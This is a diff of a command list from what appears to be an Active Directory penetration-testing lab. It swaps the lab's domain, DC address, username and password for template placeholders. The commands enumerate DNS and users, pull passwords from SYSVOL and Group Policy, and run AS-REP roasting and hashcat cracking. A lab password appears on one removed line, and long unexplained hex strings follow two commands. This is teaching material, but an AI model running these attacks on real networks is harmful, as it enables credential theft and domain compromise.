@@ -10,13 +10,13 @@
 
 ```powershell
 Import-Module .\SecurityAssessment.ps1
-Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.{{DOMAIN_UPPER}}
 ```
 
 ## 2. `shellsession` _(output omitted)_
 
 ```bash
-adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
+adidnsdump -u {{DOMAIN_NB}}\\{{USERNAME}} ldap://{{DC_IP}} 
 ```
 
 ## 3. `shellsession` _(output omitted)_
@@ -28,7 +28,7 @@ head records.csv
 ## 4. `shellsession` _(output omitted)_
 
 ```bash
-adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
+adidnsdump -u {{DOMAIN_NB}}\\{{USERNAME}} ldap://{{DC_IP}} -r
 ```
 
 ## 5. `shellsession` _(output omitted)_
@@ -52,13 +52,13 @@ Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useracco
 ## 8. `powershell` _(output omitted)_
 
 ```powershell
-ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
+ls \\academy-ea-dc01\SYSVOL\{{DOMAIN_UPPER}}\scripts
 ```
 
 ## 9. `powershell` _(output omitted)_
 
 ```powershell
-cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
+cat \\academy-ea-dc01\SYSVOL\{{DOMAIN_UPPER}}\scripts\reset_local_admin_pass.vbs
 ```
 
 ## 10. `shellsession` _(output omitted)_
@@ -76,7 +76,7 @@ crackmapexec smb -L | grep gpp
 ## 12. `shellsession` _(output omitted)_
 
 ```bash
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} -M gpp_autologin
 ```
 
 ## 13. `powershell` _(output omitted)_
@@ -102,14 +102,14 @@ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
 ## 16. `shellsession` _(output omitted)_
 
 ```bash
-kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
+kerbrute userenum -d {{DOMAIN}} --dc {{DC_IP}} /opt/jsmith.txt 
 8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fccbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a
 ```
 
 ## 17. `shellsession` _(output omitted)_
 
 ```bash
-GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
+GetNPUsers.py {{DOMAIN_UPPER}}/ -dc-ip {{DC_IP}} -no-pass -usersfile valid_ad_users 
 b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9
 ```
 
@@ -138,8 +138,8 @@ Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
 PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
 
 DisplayName      : Disconnect Idle RDP
-DomainName       : INLANEFREIGHT.LOCAL
-Owner            : INLANEFREIGHT\Domain Admins
+DomainName       : {{DOMAIN_UPPER}}
+Owner            : {{DOMAIN_NB}}\Domain Admins
 Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
 GpoStatus        : AllSettingsEnabled
 Description      :
